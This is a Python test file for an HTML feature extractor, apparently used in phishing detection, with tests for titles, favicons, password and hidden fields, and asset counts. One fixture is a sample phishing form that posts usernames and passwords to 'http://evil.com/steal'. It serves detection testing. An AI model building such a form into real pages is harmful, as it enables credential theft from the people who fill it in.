from backend.app.analyzers.html_features import HtmlFeatures

MINIMAL_HTML = "<html><body><p>Hello</p></body></html>"

FULL_HTML = """
<html>
<head>
  <title>My Site</title>
  <link rel="icon" href="/favicon.ico">
  <meta name="description" content="A great site">
  <link rel="stylesheet" href="/style.css">
  <script src="/app.js"></script>
</head>
<body>
  <img src="/logo.png">
  <form>
    <input type="password" name="pwd">
    <input type="hidden" name="token" value="abc">
  </form>
</body>
</html>
"""

PHISHING_HTML = """
<html>
<body>
  <form action="http://evil.com/steal">
    <input type="text" name="user">
    <input type="password" name="pass">
    <input type="hidden" name="csrf" value="x">
    <input type="hidden" name="redirect" value="y">
  </form>
</body>
</html>
"""


class TestHtmlFeatures:

    def test_returns_all_expected_keys(self):
        feats = HtmlFeatures.extract(MINIMAL_HTML)
        expected = {
            "HasTitle", "HasFavicon", "HasDescription",
            "HasPasswordField", "HasHiddenFields",
            "NoOfImage", "NoOfCSS", "NoOfJS",
        }
        assert expected == feats.keys()

    def test_minimal_html_no_optional_features(self):
        feats = HtmlFeatures.extract(MINIMAL_HTML)
        assert feats["HasTitle"] == 0
        assert feats["HasFavicon"] == 0
        assert feats["HasDescription"] == 0
        assert feats["HasPasswordField"] == 0
        assert feats["HasHiddenFields"] == 0
        assert feats["NoOfImage"] == 0
        assert feats["NoOfCSS"] == 0

    def test_full_html_detects_all_features(self):
        feats = HtmlFeatures.extract(FULL_HTML)
        assert feats["HasTitle"] == 1
        assert feats["HasFavicon"] == 1
        assert feats["HasDescription"] == 1
        assert feats["HasPasswordField"] == 1
        assert feats["HasHiddenFields"] == 1
        assert feats["NoOfImage"] == 1
        assert feats["NoOfCSS"] == 1
        assert feats["NoOfJS"] == 1

    def test_phishing_html_password_and_hidden_detected(self):
        feats = HtmlFeatures.extract(PHISHING_HTML)
        assert feats["HasPasswordField"] == 1
        assert feats["HasHiddenFields"] == 1

    def test_phishing_html_no_title(self):
        feats = HtmlFeatures.extract(PHISHING_HTML)
        assert feats["HasTitle"] == 0

    def test_multiple_images_counted(self):
        html = "<html><body><img src='a.png'><img src='b.png'><img src='c.png'></body></html>"
        feats = HtmlFeatures.extract(html)
        assert feats["NoOfImage"] == 3

    def test_multiple_scripts_counted(self):
        html = "<html><body><script src='a.js'></script><script src='b.js'></script></body></html>"
        feats = HtmlFeatures.extract(html)
        assert feats["NoOfJS"] == 2

    def test_multiple_css_files_counted(self):
        html = """
        <html><head>
          <link rel="stylesheet" href="a.css">
          <link rel="stylesheet" href="b.css">
        </head></html>
        """
        feats = HtmlFeatures.extract(html)
        assert feats["NoOfCSS"] == 2

    def test_empty_html(self):
        feats = HtmlFeatures.extract("")
        assert feats["HasTitle"] == 0
        assert feats["NoOfImage"] == 0
        assert feats["HasPasswordField"] == 0

    def test_multiple_hidden_fields_detected_as_flag(self):
        html = """
        <html><body>
          <input type="hidden" name="a" value="1">
          <input type="hidden" name="b" value="2">
        </body></html>
        """
        feats = HtmlFeatures.extract(html)
        assert feats["HasHiddenFields"] == 1
